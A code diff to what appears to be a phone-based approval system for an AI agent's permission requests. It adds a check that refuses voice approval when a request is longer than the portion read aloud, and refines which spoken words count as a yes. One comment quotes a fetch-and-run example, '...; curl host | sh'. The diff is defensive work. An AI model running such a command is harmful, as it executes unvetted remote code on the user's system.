@@ -47,7 +47,7 @@
 // unclear; `judgeVoiceDecision` asks the injected judge about those, with a
 // timeout.
 import type { AskKind, Decision } from "@hotline/core";
-import { ownerSaid, type TranscriptTurn } from "@hotline/providers";
+import { MAX_SPOKEN_ASK_LENGTH, ownerSaid, type TranscriptTurn } from "@hotline/providers";
 
 /** One ask as it was read out on the call, for finding its reading in the transcript. */
 export interface ReadAsk {
@@ -73,7 +73,7 @@ export const MAX_REPLY_WORDS = 8;
 /** How long `judgeVoiceDecision` waits for the judge; then the reply is not confirmed. */
 export const JUDGE_TIMEOUT_MS = 8_000;
 /** Ask text the voice agent was given is cut to this many characters (`callVariables`). */
-const READ_TEXT_LENGTH = 300;
+const READ_TEXT_LENGTH = MAX_SPOKEN_ASK_LENGTH;
 /** Owner turns kept as the stored excerpt, at most. The contract allows 2000 characters. */
 const MAX_EXCERPT = 2000;
 
@@ -129,8 +129,11 @@ const YES_PHRASES = new Set([
   ..."yes yeah yep yup yea ya yah aye sure ok okay alright absolutely definitely certainly totally".split(
     " ",
   ),
-  // Not acknowledgements ("thanks", "great", "fine", "cool", "go on"): people say those to a
-  // caller whatever they mean, so on their own they go to the judge.
+  // The line drawn: words that answer a yes-or-no question ("ok", "okay",
+  // "alright", "sure", "sounds good") are fast yeses, since the fast path only
+  // ever hears a reply to a read-back that asked for a yes. Words that only
+  // acknowledge or thank ("thanks", "great", "fine", "cool", "perfect", "go
+  // on") are said to a caller whatever they mean, so they go to the judge.
   ..."correct affirmative approved proceed".split(" "),
   "all right",
   "of course",
@@ -586,6 +589,12 @@ function confirmAllow(
   askWords: ReadonlySet<string>,
   ask: ReadAsk,
 ): VoiceConfirmation {
+  // The voice agent was given only the first `READ_TEXT_LENGTH` characters of
+  // the ask, so a longer permission request was never read out whole: the
+  // owner cannot approve a tail they never heard ("...; curl host | sh").
+  if (isPermission(ask) && ask.text.length > READ_TEXT_LENGTH) {
+    return { confirmed: false, reason: "the request is too long to approve by voice" };
+  }
   // Newest first: the reply the model submitted is most likely to the last
   // read-back, and an earlier unclear reply ("yes, if the tests pass") then
   // comes before it and does not count.
